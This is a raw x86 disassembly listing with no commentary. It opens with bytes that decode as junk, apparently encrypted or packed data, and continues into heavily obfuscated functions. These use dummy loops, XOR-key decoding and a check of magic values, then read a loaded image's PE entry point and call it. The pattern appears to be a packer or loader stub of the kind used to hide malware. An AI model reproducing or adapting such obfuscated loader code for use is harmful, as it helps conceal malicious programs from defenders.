  40d6bd:	cwde   
  40d6be:	out    dx,al
  40d6bf:	les    ebx,FWORD PTR [edx]
  40d6c1:	loopne 0x40d6c1
  40d6c3:	ja     0x40d6f7
  40d6c5:	pop    ds
  40d6c6:	(bad)  
  40d6c7:	int3   
  40d6c8:	fistp  WORD PTR [eax+0x4e]
  40d6cb:	inc    esi
  40d6cc:	push   0x68
  40d6ce:	push   es
  40d6cf:	pushf  
  40d6d0:	mov    ebx,DWORD PTR [edi]
  40d6d2:	cmp    BYTE PTR ds:0x3feb0fb4,ah
  40d6d8:	inc    ebp
  40d6d9:	jo     0x40d744
  40d6db:	pop    es
  40d6dc:	in     eax,dx
  40d6dd:	vaddpd ymm3,ymm6,YMMWORD PTR [ebx+0x2e]
  40d6e2:	fcmove st,st(3)
  40d6e4:	or     BYTE PTR ds:0x4651c5b0,ah
  40d6ea:	pop    eax
  40d6eb:	cld    
  40d6ec:	aad    0xdd
  40d6ee:	fdiv   QWORD PTR ds:[ebx-0x67694451]
  40d6f5:	cmp    ebx,DWORD PTR [ebx+esi*2+0x7d]
  40d6f9:	jo     0x40d696
  40d6fb:	xor    dh,bh
  40d6fd:	push   edi
  40d6fe:	test   BYTE PTR [esi-0x7937a599],al
  40d704:	test   BYTE PTR [ecx-0x2b],ch
  40d707:	dec    ebx
  40d708:	arpl   WORD PTR [edi+0x34],di
  40d70b:	(bad)  
  40d70c:	pushf  
  40d70d:	inc    ebp
  40d70e:	push   esi
  40d70f:	or     al,0xd7
  40d711:	neg    DWORD PTR [esi+0x17]
  40d714:	mov    esi,0xbda0842d
  40d719:	xor    eax,0xc71187f3
  40d71e:	xchg   esp,eax
  40d71f:	pushf  
  40d720:	push   ebx
  40d721:	sub    DWORD PTR [esi],edx
  40d723:	out    0x60,eax
  40d725:	ins    BYTE PTR es:[edi],dx
  40d726:	dec    esp
  40d727:	push   0xffffff8c
  40d729:	bound  edx,QWORD PTR [eax+0x23c8dc55]
  40d72f:	xor    BYTE PTR [ecx-0x3a],bl
  40d732:	cmc    
  40d733:	sub    eax,0x56b92805
  40d738:	test   BYTE PTR [ecx+0x4054a2fb],cl
  40d73e:	(bad)  
  40d73f:	clc    
  40d740:	lock ss sbb al,0x54
  40d744:	retf   
  40d745:	out    0x66,eax
  40d747:	fmul   QWORD PTR [eax-0x4ad534e3]
  40d74d:	fs jg  0x40d710
  40d750:	adc    DWORD PTR [edx+0x41],0xffffff95
  40d754:	mov    ds:0xe7ad77f5,eax
  40d759:	inc    ecx
  40d75a:	inc    ebx
  40d75b:	stos   DWORD PTR es:[edi],eax
  40d75c:	mov    al,ds:0x66a0c4c7
  40d761:	rcr    BYTE PTR [eax+ebp*4],cl
  40d764:	out    0x1d,eax
  40d766:	jbe    0x40d6fc
  40d768:	push   es
  40d769:	jmp    0x30d6:0x3def60e6
  40d770:	shl    esp,1
  40d772:	mov    al,0xd3
  40d774:	retf   
  40d775:	jle    0x40d714
  40d777:	sbb    BYTE PTR [esi-0x7],dl
  40d77a:	push   ebp
  40d77b:	add    esi,ecx
  40d77d:	fistp  DWORD PTR [ecx-0x1]
  40d780:	or     ebx,DWORD PTR [ecx+0x46866691]
  40d786:	mov    ebx,0xc1e479e1
  40d78c:	xor    ebx,DWORD PTR [esp+ecx*8-0x1e3ac724]
  40d793:	imul   esi,DWORD PTR [ebp-0x19],0x70
  40d797:	ret    
  40d798:	pusha  
  40d799:	int3   
  40d79a:	retf   0x8c3c
  40d79d:	shl    dl,cl
  40d79f:	ret    
  40d7a0:	sbb    cl,0x63
  40d7a3:	cdq    
  40d7a4:	adc    al,0x7a
  40d7a6:	pusha  
  40d7a7:	sub    esi,DWORD PTR [esi-0x69]
  40d7aa:	outs   dx,DWORD PTR ds:[esi]
  40d7ab:	cli    
  40d7ac:	inc    esi
  40d7ad:	int3   
  40d7ae:	mov    ecx,ss
  40d7b0:	cmp    dh,BYTE PTR [edx-0x29df07ac]
  40d7b6:	inc    esp
  40d7b7:	popf   
  40d7b8:	jg     0x40d838
  40d7ba:	int    0x27
  40d7bc:	das    
  40d7bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7be:	or     edi,DWORD PTR [ebx-0x4fd7cd61]
  40d7c4:	nop
  40d7c5:	stos   BYTE PTR es:[edi],al
  40d7c6:	lahf   
  40d7c7:	push   edi
  40d7c8:	out    0x98,al
  40d7ca:	jg     0x40d7cf
  40d7cc:	shl    dl,0x4e
  40d7cf:	or     edx,DWORD PTR [edi+0x5592c2ac]
  40d7d5:	lahf   
  40d7d6:	jae    0x40d78a
  40d7d8:	jo     0x40d835
  40d7da:	std    
  40d7db:	inc    eax
  40d7dc:	mov    esp,edi
  40d7de:	mov    esi,eax
  40d7e0:	mov    dl,0x9a
  40d7e2:	rol    BYTE PTR [ecx+0x36491925],cl
  40d7e8:	push   ebp
  40d7e9:	(bad)  
  40d7ea:	cmc    
  40d7eb:	mov    ds:0x7a0f0dac,eax
  40d7f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7f1:	ret    
  40d7f2:	mov    bl,0xf7
  40d7f4:	lods   eax,DWORD PTR ds:[esi]
  40d7f5:	aaa    
  40d7f6:	sbb    BYTE PTR [edx-0x1395d4f0],bl
  40d7fc:	fisttp DWORD PTR [edx]
  40d7fe:	xor    al,0xf8
  40d800:	ss ins DWORD PTR es:[edi],dx
  40d802:	xchg   ecx,eax
  40d803:	sbb    edi,DWORD PTR [ebx+0xc]
  40d806:	sub    BYTE PTR cs:[eax],0x30
  40d80a:	out    0x24,al
  40d80c:	pop    edi
  40d80d:	imul   eax,DWORD PTR [edx+0x3c],0x208975ac
  40d814:	inc    esi
  40d815:	imul   dx,WORD PTR [ebx+0x5a],0x370f
  40d81b:	hlt    
  40d81c:	mov    bl,0xda
  40d81e:	xchg   DWORD PTR [ebx+0x10],ebp
  40d821:	icebp  
  40d822:	aas    
  40d823:	dec    eax
  40d824:	inc    esi
  40d825:	push   0x7764cb4e
  40d82a:	dec    dl
  40d82c:	out    0x76,al
  40d82e:	sub    DWORD PTR ds:0xdd3f1377,ecx
  40d834:	xchg   ebp,eax
  40d835:	std    
  40d836:	retf   
  40d837:	shr    DWORD PTR [eax-0x36],1
  40d83a:	mov    ds:0x9a91559a,al
  40d83f:	and    eax,0x28293722
  40d844:	mov    ds:0x2ac1db8c,al
  40d849:	mov    dl,0xe
  40d84b:	xor    eax,0x51529084
  40d850:	loopne 0x40d828
  40d852:	loop   0x40d8b2
  40d854:	jl     0x40d878
  40d856:	and    eax,0x617b2486
  40d85b:	mov    cl,0xee
  40d85d:	sub    eax,0xa7f36eac
  40d862:	sub    al,0xb3
  40d864:	shl    BYTE PTR [ebx],1
  40d866:	pop    ebp
  40d867:	mov    ecx,0xfadfa376
  40d86c:	retf   
  40d86d:	mov    esi,0x6ab4ccd3
  40d872:	add    edi,DWORD PTR [ebp-0x10]
  40d875:	mov    edx,DWORD PTR [ebp-0x20]
  40d878:	mov    ebx,DWORD PTR [ebp-0x8]
  40d87b:	xor    edx,eax
  40d87d:	add    edx,ecx
  40d87f:	imul   edx,ebx
  40d882:	cmp    edx,edi
  40d884:	jbe    0x40a7b9
  40d88a:	pop    ebx
  40d88b:	pop    edi
  40d88c:	leave  
  40d88d:	ret    0x8
  40d890:	push   ebp
  40d891:	mov    ebp,esp
  40d893:	sub    esp,0x70
  40d896:	or     DWORD PTR ds:0x42fce9,0x42e11c
  40d8a0:	push   0x41b2bc
  40d8a5:	sbb    DWORD PTR ds:0x42fd76,0x42fcf1
  40d8af:	call   DWORD PTR ds:0x42e497
  40d8b5:	and    DWORD PTR ds:0x42fcfd,0x42fd82
  40d8bf:	test   ax,ax
  40d8c2:	jne    0x40d8d9
  40d8c8:	xor    eax,eax
  40d8ca:	mov    DWORD PTR ds:0x42e134,0x1bc4
  40d8d4:	jmp    0x40e0cc
  40d8d9:	adc    DWORD PTR ds:0x42e124,0x42fce9
  40d8e3:	push   0x41b2d4
  40d8e8:	call   DWORD PTR ds:0x42e50f
  40d8ee:	sbb    DWORD PTR ds:0x42e6fb,0x42fd72
  40d8f8:	test   ax,ax
  40d8fb:	mov    DWORD PTR ds:0x42fcf5,0x74f8
  40d905:	je     0x40d8c8
  40d90b:	call   DWORD PTR ds:0x42e457
  40d911:	cdq    
  40d912:	mov    DWORD PTR ds:0x42fd05,0x1251
  40d91c:	cmp    eax,0x45767589
  40d921:	jne    0x40d98c
  40d927:	mov    DWORD PTR ds:0x42fd76,0x294f
  40d931:	cmp    edx,0x87676567
  40d937:	jne    0x40d98c
  40d93d:	push   0x0
  40d93f:	push   0x0
  40d941:	adc    DWORD PTR ds:0x42e124,0x42e6f7
  40d94b:	push   0x9879874
  40d950:	push   0x45
  40d952:	push   0x1
  40d954:	push   0x545
  40d959:	push   0x87686787
  40d95e:	xor    DWORD PTR ds:0x42fd6e,0x75b9
  40d968:	push   0x9879877
  40d96d:	or     DWORD PTR ds:0x42fced,0x42e118
  40d977:	call   DWORD PTR ds:0x42e49f
  40d97d:	mov    DWORD PTR ds:0x42e11c,0x1611
  40d987:	jmp    0x40e0cc
  40d98c:	push   0x41b2e0
  40d991:	call   DWORD PTR ds:0x42e38f
  40d997:	test   eax,eax
  40d999:	je     0x40d9cd
  40d99f:	sbb    DWORD PTR ds:0x42fd01,0x42e134
  40d9a9:	push   0x41b314
  40d9ae:	and    DWORD PTR ds:0x42fced,0x2b9d
  40d9b8:	call   DWORD PTR ds:0x42e2fb
  40d9be:	mov    DWORD PTR ds:0x42fd8a,0x47ee
  40d9c8:	jmp    0x40e0cc
  40d9cd:	push   ebx
  40d9ce:	mov    ebx,0xf89c8531
  40d9d3:	add    DWORD PTR ds:0x42e118,ebx
  40d9d9:	mov    DWORD PTR [ebp-0x8],ebx
  40d9dc:	and    DWORD PTR ds:0x42fcf5,0x0
  40d9e6:	mov    ecx,DWORD PTR ds:0x42fcf5
  40d9ec:	inc    ecx
  40d9ed:	mov    DWORD PTR ds:0x42fcf5,ecx
  40d9f3:	cmp    DWORD PTR ds:0x42fcf5,0xf
  40d9fa:	jne    0x40da20
  40da00:	push   0x1990
  40da05:	push   0x7f06
  40da0a:	push   0x857e
  40da0f:	push   DWORD PTR [ebp-0x28]
  40da12:	push   0x42e18d
  40da17:	push   DWORD PTR [ebp-0x10]
  40da1a:	call   DWORD PTR ds:0x42e54f
  40da20:	cmp    DWORD PTR ds:0x42fcf5,0xe
  40da27:	jne    0x40da3a
  40da2d:	mov    ecx,DWORD PTR ds:0x42fcf5
  40da33:	inc    ecx
  40da34:	mov    DWORD PTR ds:0x42fcf5,ecx
  40da3a:	cmp    DWORD PTR ds:0x42fcf5,0x1d
  40da41:	jb     0x40d9e6
  40da47:	add    DWORD PTR ds:0x42e703,0x406c
  40da51:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  40da58:	lea    eax,[ebp-0x18]
  40da5b:	adc    DWORD PTR ds:0x42e6f3,ecx
  40da61:	mov    DWORD PTR [ebp-0x14],eax
  40da64:	adc    DWORD PTR ds:0x42fcd1,0x42e11c
  40da6e:	lea    eax,[ebp-0x1c]
  40da71:	mov    DWORD PTR ds:0x42fd05,0x1a
  40da7b:	cmp    DWORD PTR ds:0x42fd05,0x0
  40da82:	je     0x40dbc3
  40da88:	cmp    DWORD PTR ds:0x42fd05,0x1c
  40da8f:	jne    0x40daa1
  40da95:	push   DWORD PTR [ebp-0x1c]
  40da98:	push   DWORD PTR [ebp-0x14]
  40da9b:	call   DWORD PTR ds:0x42e553
  40daa1:	xor    ecx,ecx
  40daa3:	add    ecx,DWORD PTR ds:0x42fd05
  40daa9:	dec    ecx
  40daaa:	mov    DWORD PTR ds:0x42fd05,ecx
  40dab0:	jmp    0x40da7b
  40dab5:	mov    DWORD PTR ds:0x42e707,0x1d
  40dabf:	cmp    DWORD PTR ds:0x42e707,0x0
  40dac6:	je     0x40dbc3
  40dacc:	cmp    DWORD PTR ds:0x42e707,0xf
  40dad3:	jne    0x40dae4
  40dad9:	push   0x1303
  40dade:	call   DWORD PTR ds:0x42e463
  40dae4:	cmp    DWORD PTR ds:0x42e707,0x10
  40daeb:	jne    0x40dafe
  40daf1:	mov    ecx,DWORD PTR ds:0x42e707
  40daf7:	dec    ecx
  40daf8:	mov    DWORD PTR ds:0x42e707,ecx
  40dafe:	mov    ecx,DWORD PTR ds:0x42e707
  40db04:	dec    ecx
  40db05:	mov    DWORD PTR ds:0x42e707,ecx
  40db0b:	jmp    0x40dabf
  40db10:	mov    DWORD PTR ds:0x42e6ff,0x14
  40db1a:	cmp    DWORD PTR ds:0x42e6ff,0x0
  40db21:	je     0x40dbc3
  40db27:	cmp    DWORD PTR ds:0x42e6ff,0x2
  40db2e:	jne    0x40db41
  40db34:	push   0x1
  40db36:	push   0x279d
  40db3b:	call   DWORD PTR ds:0x42e557
  40db41:	cmp    DWORD PTR ds:0x42e6ff,0x3
  40db48:	jne    0x40db5b
  40db4e:	mov    ecx,DWORD PTR ds:0x42e6ff
  40db54:	dec    ecx
  40db55:	mov    DWORD PTR ds:0x42e6ff,ecx
  40db5b:	mov    ecx,DWORD PTR ds:0x42e6ff
  40db61:	dec    ecx
  40db62:	mov    DWORD PTR ds:0x42e6ff,ecx
  40db68:	jmp    0x40db1a
  40db6d:	mov    DWORD PTR ds:0x42fd76,0x1a
  40db77:	cmp    DWORD PTR ds:0x42fd76,0x0
  40db7e:	je     0x40dbc3
  40db84:	cmp    DWORD PTR ds:0x42fd76,0x6
  40db8b:	jne    0x40db97
  40db91:	call   DWORD PTR ds:0x42e55b
  40db97:	cmp    DWORD PTR ds:0x42fd76,0x7
  40db9e:	jne    0x40dbb1
  40dba4:	mov    ecx,DWORD PTR ds:0x42fd76
  40dbaa:	dec    ecx
  40dbab:	mov    DWORD PTR ds:0x42fd76,ecx
  40dbb1:	mov    ecx,DWORD PTR ds:0x42fd76
  40dbb7:	dec    ecx
  40dbb8:	mov    DWORD PTR ds:0x42fd76,ecx
  40dbbe:	jmp    0x40db77
  40dbc3:	mov    DWORD PTR [ebp-0xc],eax
  40dbc6:	or     ecx,eax
  40dbc8:	mov    eax,ds:0x41b1a8
  40dbcd:	or     DWORD PTR ds:0x42e707,edx
  40dbd3:	mov    eax,DWORD PTR [eax+0x1c8]
  40dbd9:	or     DWORD PTR ds:0x42e713,edx
  40dbdf:	mov    eax,DWORD PTR [eax]
  40dbe1:	mov    ecx,DWORD PTR [ebp-0xc]
  40dbe4:	push   esi
  40dbe5:	mov    esi,0x7510855
  40dbea:	sub    DWORD PTR ds:0x42fd7e,0x662
  40dbf4:	xor    eax,esi
  40dbf6:	push   edi
  40dbf7:	and    DWORD PTR ds:0x42fce5,0x0
  40dc01:	jmp    0x40dc13
  40dc06:	mov    edi,DWORD PTR ds:0x42fce5
  40dc0c:	inc    edi
  40dc0d:	mov    DWORD PTR ds:0x42fce5,edi
  40dc13:	cmp    DWORD PTR ds:0x42fce5,0x1d
  40dc1a:	jae    0x40dc4a
  40dc20:	cmp    DWORD PTR ds:0x42fce5,0x2b
  40dc27:	jne    0x40dc45
  40dc2d:	push   0x3dd1
  40dc32:	push   DWORD PTR [ebp-0x24]
  40dc35:	push   0x2bbe
  40dc3a:	push   0x75d2
  40dc3f:	call   DWORD PTR ds:0x42e467
  40dc45:	jmp    0x40dc06
  40dc4a:	mov    edi,0x32729c
  40dc4f:	add    eax,edi
  40dc51:	mov    DWORD PTR [ecx],eax
  40dc53:	mov    DWORD PTR ds:0x42e128,edx
  40dc59:	mov    eax,ds:0x41b418
  40dc5e:	mov    DWORD PTR ds:0x42fd01,0x477b
  40dc68:	cmp    eax,0x23c13046
  40dc6d:	mov    eax,DWORD PTR [ebp-0x4]
  40dc70:	mov    DWORD PTR ds:0x42fd09,0x45bc
  40dc7a:	je     0x40dd06
  40dc80:	mov    DWORD PTR ds:0x42e6f7,0x1c
  40dc8a:	cmp    DWORD PTR ds:0x42e6f7,0x0
  40dc91:	je     0x40dcd6
  40dc97:	cmp    DWORD PTR ds:0x42e6f7,0xa
  40dc9e:	jne    0x40dcaa
  40dca4:	call   DWORD PTR ds:0x42e46b
  40dcaa:	cmp    DWORD PTR ds:0x42e6f7,0xb
  40dcb1:	jne    0x40dcc4
  40dcb7:	mov    ecx,DWORD PTR ds:0x42e6f7
  40dcbd:	dec    ecx
  40dcbe:	mov    DWORD PTR ds:0x42e6f7,ecx
  40dcc4:	mov    ecx,DWORD PTR ds:0x42e6f7
  40dcca:	dec    ecx
  40dccb:	mov    DWORD PTR ds:0x42e6f7,ecx
  40dcd1:	jmp    0x40dc8a
  40dcd6:	mov    ecx,DWORD PTR [ebp-0x8]
  40dcd9:	sbb    DWORD PTR ds:0x42fd82,0x42e12c
  40dce3:	xor    eax,esi
  40dce5:	and    DWORD PTR ds:0x42fd82,0x42e124
  40dcef:	add    eax,edi
  40dcf1:	imul   eax,ecx
  40dcf4:	mov    DWORD PTR [ebp-0x8],eax
  40dcf7:	mov    DWORD PTR ds:0x42fcd1,0x365a
  40dd01:	jmp    0x40ddd3
  40dd06:	sbb    DWORD PTR ds:0x42e118,edx
  40dd0c:	xor    eax,esi
  40dd0e:	add    eax,edi
  40dd10:	and    DWORD PTR ds:0x42fd72,0x0
  40dd1a:	jmp    0x40dd2c
  40dd1f:	mov    ecx,DWORD PTR ds:0x42fd72
  40dd25:	inc    ecx
  40dd26:	mov    DWORD PTR ds:0x42fd72,ecx
  40dd2c:	cmp    DWORD PTR ds:0x42fd72,0x12
  40dd33:	jae    0x40dd6e
  40dd39:	cmp    DWORD PTR ds:0x42fd72,0x6
  40dd40:	jne    0x40dd4f
  40dd46:	push   DWORD PTR [ebp-0x24]
  40dd49:	call   DWORD PTR ds:0x42e46f
  40dd4f:	cmp    DWORD PTR ds:0x42fd72,0x5
  40dd56:	jne    0x40dd69
  40dd5c:	mov    ecx,DWORD PTR ds:0x42fd72
  40dd62:	inc    ecx
  40dd63:	mov    DWORD PTR ds:0x42fd72,ecx
  40dd69:	jmp    0x40dd1f
  40dd6e:	mov    ds:0x41b2b8,eax
  40dd73:	mov    eax,DWORD PTR [ebp-0x8]
  40dd76:	or     DWORD PTR ds:0x42fd0d,edx
  40dd7c:	xor    eax,esi
  40dd7e:	sub    DWORD PTR ds:0x42e130,edx
  40dd84:	add    eax,edi
  40dd86:	mov    ds:0x41b418,eax
  40dd8b:	mov    eax,DWORD PTR [ebp-0x4]
  40dd8e:	mov    ecx,DWORD PTR ds:0x41b2b8
  40dd94:	xor    eax,esi
  40dd96:	add    eax,edi
  40dd98:	mov    DWORD PTR ds:0x42fd09,0x3e5c
  40dda2:	cmp    ecx,eax
  40dda4:	jne    0x40ddd3
  40ddaa:	sub    DWORD PTR ds:0x42fd86,0x42fcfd
  40ddb4:	push   DWORD PTR [ebp-0x4]
  40ddb7:	and    DWORD PTR ds:0x42e6f3,0x4c1c
  40ddc1:	push   DWORD PTR [ebp-0x8]
  40ddc4:	adc    DWORD PTR ds:0x42e6ff,0x42fd8a
  40ddce:	call   0x40e0d0
  40ddd3:	mov    eax,ds:0x41b1a8
  40ddd8:	sbb    edx,DWORD PTR ds:0x42e6eb
  40ddde:	mov    eax,DWORD PTR [eax+0x18c]
  40dde4:	and    DWORD PTR ds:0x42fce5,0x0
  40ddee:	mov    edx,DWORD PTR ds:0x42fce5
  40ddf4:	inc    edx
  40ddf5:	mov    DWORD PTR ds:0x42fce5,edx
  40ddfb:	cmp    DWORD PTR ds:0x42fce5,0x18
  40de02:	jne    0x40de18
  40de08:	push   0x42fd09
  40de0d:	push   0x42e26d
  40de12:	call   DWORD PTR ds:0x42e473
  40de18:	cmp    DWORD PTR ds:0x42fce5,0x13
  40de1f:	jb     0x40ddee
  40de25:	mov    ecx,DWORD PTR ds:0x42fd21
  40de2b:	mov    ecx,DWORD PTR [ecx]
  40de2d:	or     DWORD PTR ds:0x42fcfd,ecx
  40de33:	mov    eax,DWORD PTR [eax]
  40de35:	mov    DWORD PTR ds:0x42fcf5,0x11
  40de3f:	cmp    DWORD PTR ds:0x42fcf5,0x0
  40de46:	je     0x40de77
  40de4c:	cmp    DWORD PTR ds:0x42fcf5,0x19
  40de53:	jne    0x40de65
  40de59:	push   DWORD PTR [ebp-0xc]
  40de5c:	push   DWORD PTR [ebp-0x10]
  40de5f:	call   DWORD PTR ds:0x42e55f
  40de65:	mov    edx,DWORD PTR ds:0x42fcf5
  40de6b:	dec    edx
  40de6c:	mov    DWORD PTR ds:0x42fcf5,edx
  40de72:	jmp    0x40de3f
  40de77:	mov    DWORD PTR [ebp-0x20],eax
  40de7a:	mov    eax,0xf89c853d
  40de7f:	mov    DWORD PTR [ebp-0x24],eax
  40de82:	mov    DWORD PTR [ebp-0x24],eax
  40de85:	mov    DWORD PTR [ebp-0x24],eax
  40de88:	mov    DWORD PTR [ebp-0xc],ebx
  40de8b:	mov    DWORD PTR [ebp-0x24],eax
  40de8e:	mov    DWORD PTR [ebp-0x24],0xf89c8539
  40de95:	mov    ebx,DWORD PTR [ebp-0x8]
  40de98:	mov    ecx,DWORD PTR [ebp-0x4]
  40de9b:	mov    edx,DWORD PTR [ebp-0x4]
  40de9e:	xor    edx,esi
  40dea0:	xor    ecx,esi
  40dea2:	add    ecx,edx
  40dea4:	mov    edx,DWORD PTR [ebp-0x4]
  40dea7:	xor    ebx,esi
  40dea9:	xor    edx,esi
  40deab:	add    ebx,edi
  40dead:	lea    ecx,[ecx+edx*1+0x9757d4]
  40deb4:	cmp    ebx,ecx
  40deb6:	ja     0x40df17
  40debc:	mov    eax,DWORD PTR [ebp-0x4]
  40debf:	xor    eax,esi
  40dec1:	lea    eax,[eax+ebx*1+0x32729c]
  40dec8:	push   eax
  40dec9:	mov    eax,DWORD PTR [ebp-0xc]
  40decc:	xor    eax,esi
  40dece:	lea    eax,[ebp+eax*1+0x3272a4]
  40ded5:	push   eax
  40ded6:	mov    eax,ds:0x41b1a8
  40dedb:	push   DWORD PTR [eax+0x1bc]
  40dee1:	call   0x402976
  40dee6:	mov    eax,DWORD PTR [ebp-0x4]
  40dee9:	xor    eax,esi
  40deeb:	lea    ebx,[ebx+eax*1+0x32729c]
  40def2:	mov    eax,DWORD PTR [ebp-0x4]
  40def5:	mov    ecx,DWORD PTR [ebp-0x4]
  40def8:	xor    ecx,esi
  40defa:	xor    eax,esi
  40defc:	add    eax,ecx
  40defe:	mov    ecx,DWORD PTR [ebp-0x4]
  40df01:	xor    ecx,esi
  40df03:	lea    eax,[eax+ecx*1+0x9757d4]
  40df0a:	cmp    ebx,eax
  40df0c:	jbe    0x40debc
  40df12:	mov    eax,0xf89c853d
  40df17:	mov    ecx,DWORD PTR [ebp+0xc]
  40df1a:	mov    DWORD PTR ds:0x41b02c,ecx
  40df20:	mov    ecx,DWORD PTR [ebp+0x10]
  40df23:	mov    DWORD PTR ds:0x41b280,ecx
  40df29:	mov    ecx,DWORD PTR ds:0x41b02c
  40df2f:	mov    edx,DWORD PTR [ebp-0x14]
  40df32:	sub    ecx,edi
  40df34:	xor    ecx,esi
  40df36:	mov    DWORD PTR [edx],ecx
  40df38:	mov    ecx,DWORD PTR [ebp-0x18]
  40df3b:	cmp    ecx,0xf89c8530
  40df41:	je     0x40df9e
  40df47:	mov    ecx,DWORD PTR [ebp-0x8]
  40df4a:	mov    edx,DWORD PTR [ebp-0x1c]
  40df4d:	xor    ecx,esi
  40df4f:	add    ecx,edi
  40df51:	cmp    ecx,edx
  40df53:	je     0x40df9e
  40df59:	mov    eax,ds:0x41b1a8
  40df5e:	mov    eax,DWORD PTR [eax+0x194]
  40df64:	mov    ecx,DWORD PTR [eax]
  40df66:	mov    eax,DWORD PTR [ecx+0x3c]
  40df69:	push   DWORD PTR ds:0x41b280
  40df6f:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40df73:	push   DWORD PTR ds:0x41b02c
  40df79:	add    eax,ecx
  40df7b:	mov    ecx,DWORD PTR ds:0x41b1a8
  40df81:	mov    ecx,DWORD PTR [ecx+0x194]
  40df87:	push   DWORD PTR [ecx]
  40df89:	call   eax
  40df8b:	mov    ecx,DWORD PTR ds:0x41b1a8
  40df91:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40df97:	mov    DWORD PTR [ecx],eax
  40df99:	jmp    0x40e0ae
  40df9e:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfa1:	mov    edx,DWORD PTR [ebp-0x20]
  40dfa4:	xor    ecx,esi
  40dfa6:	add    ecx,edi
  40dfa8:	cmp    ecx,edx
  40dfaa:	jne    0x40e091
  40dfb0:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfb3:	xor    ecx,esi
  40dfb5:	add    ecx,edi
  40dfb7:	mov    DWORD PTR ds:0x41b22c,ecx
  40dfbd:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfc0:	xor    ecx,esi
  40dfc2:	add    ecx,edi
  40dfc4:	mov    DWORD PTR ds:0x41b224,ecx
  40dfca:	mov    ecx,DWORD PTR [ebp-0x4]
  40dfcd:	mov    DWORD PTR [ebp-0xc],ecx
  40dfd0:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfd3:	mov    DWORD PTR [ebp+0xc],ecx
  40dfd6:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfd9:	xor    ecx,esi
  40dfdb:	add    ecx,edi
  40dfdd:	mov    DWORD PTR [ebp+0xc],ecx
  40dfe0:	mov    ecx,DWORD PTR ds:0x41b028
  40dfe6:	mov    ecx,DWORD PTR [ecx]
  40dfe8:	mov    DWORD PTR [ebp+0xc],ecx
  40dfeb:	mov    ecx,DWORD PTR ds:0x41b230
  40dff1:	mov    ecx,DWORD PTR [ecx]
  40dff3:	mov    DWORD PTR [ebp-0x14],ecx
  40dff6:	mov    DWORD PTR [ebp+0x10],0xf89c8731
  40dffd:	mov    ecx,DWORD PTR [ebp+0x10]
  40e000:	xor    ecx,esi
  40e002:	add    ecx,edi
  40e004:	mov    DWORD PTR [ebp+0x10],ecx
  40e007:	mov    ecx,DWORD PTR ds:0x41b1a8
  40e00d:	mov    DWORD PTR [ebp+0x10],ecx
  40e010:	mov    ecx,DWORD PTR [ebp+0xc]
  40e013:	mov    DWORD PTR [ebp+0xc],ecx
  40e016:	mov    ecx,DWORD PTR [ebp+0xc]
  40e019:	push   0x4
  40e01b:	pop    edx
  40e01c:	sub    edx,ecx
  40e01e:	add    edx,DWORD PTR [ebp-0x14]
  40e021:	mov    DWORD PTR [ebp-0x24],0xf89c85f1
  40e028:	mov    DWORD PTR [ebp+0x10],edx
  40e02b:	mov    DWORD PTR [ebp-0x70],eax
  40e02e:	mov    eax,DWORD PTR [ebp+0xc]
  40e031:	mov    DWORD PTR [ebp-0x6c],eax
  40e034:	mov    eax,DWORD PTR [ebp+0x10]
  40e037:	mov    DWORD PTR [ebp-0x68],eax
  40e03a:	mov    eax,DWORD PTR [ebp-0x24]
  40e03d:	xor    eax,esi
  40e03f:	add    eax,edi
  40e041:	mov    DWORD PTR [ebp-0x64],eax
  40e044:	lea    eax,[ebp-0x2c]
  40e047:	mov    DWORD PTR [ebp-0x60],eax
  40e04a:	mov    eax,DWORD PTR [ebp-0x70]
  40e04d:	xor    eax,esi
  40e04f:	add    eax,edi
  40e051:	mov    DWORD PTR [ebp-0x70],eax
  40e054:	lea    eax,[ebp-0x70]
  40e057:	push   eax
  40e058:	mov    eax,DWORD PTR [ebp-0xc]
  40e05b:	xor    eax,esi
  40e05d:	add    eax,edi
  40e05f:	push   eax
  40e060:	mov    eax,ds:0x41b1c8
  40e065:	push   0x41b11e
  40e06a:	push   DWORD PTR [eax]
  40e06c:	call   0x4120bb
  40e071:	xor    esi,esi
  40e073:	mov    eax,DWORD PTR [ebp+0x10]
  40e076:	sub    eax,esi
  40e078:	push   eax
  40e079:	mov    eax,DWORD PTR [ebp+0xc]
  40e07c:	add    eax,esi
  40e07e:	push   eax
  40e07f:	call   0x4099c9
  40e084:	inc    esi
  40e085:	cmp    esi,0x52
  40e088:	jb     0x40e073
  40e08e:	mov    eax,DWORD PTR [ebp-0xc]
  40e091:	call   0x406acb
  40e096:	lea    eax,[ebp+0x4]
  40e099:	mov    DWORD PTR [ebp-0x28],eax
  40e09c:	mov    eax,DWORD PTR [ebp-0x10]
  40e09f:	mov    eax,DWORD PTR [ebp-0x4]
  40e0a2:	push   DWORD PTR [ebp-0x8]
  40e0a5:	lea    eax,[ebp-0x28]
  40e0a8:	push   eax
  40e0a9:	call   0x410b90
  40e0ae:	mov    eax,ds:0x41b1a8
  40e0b3:	push   0x4
  40e0b5:	add    eax,0x1cc
  40e0ba:	push   eax
  40e0bb:	lea    eax,[ebp-0x10]
  40e0be:	push   eax
  40e0bf:	call   0x402976
  40e0c4:	mov    eax,DWORD PTR [ebp-0x10]
  40e0c7:	mov    eax,DWORD PTR [eax]
  40e0c9:	pop    edi
  40e0ca:	pop    esi
  40e0cb:	pop    ebx
  40e0cc:	leave  
  40e0cd:	ret    0xc
  40e0d0:	push   ebp
  40e0d1:	mov    ebp,esp
  40e0d3:	sub    esp,0x24
  40e0d6:	mov    eax,ds:0x41b1a8
  40e0db:	mov    eax,DWORD PTR [eax+0x198]
  40e0e1:	mov    DWORD PTR [ebp-0x8],eax
  40e0e4:	adc    ecx,eax
  40e0e6:	mov    eax,DWORD PTR [ebp+0x8]
  40e0e9:	mov    ecx,DWORD PTR [ebp-0x8]
  40e0ec:	xor    DWORD PTR ds:0x42fce9,0x42fcd5
  40e0f6:	push   ebx
  40e0f7:	push   esi
  40e0f8:	mov    esi,0x7510855
  40e0fd:	xor    eax,esi
  40e0ff:	not    ebx
  40e101:	push   edi
  40e102:	mov    edi,0x32729c
  40e107:	add    eax,edi
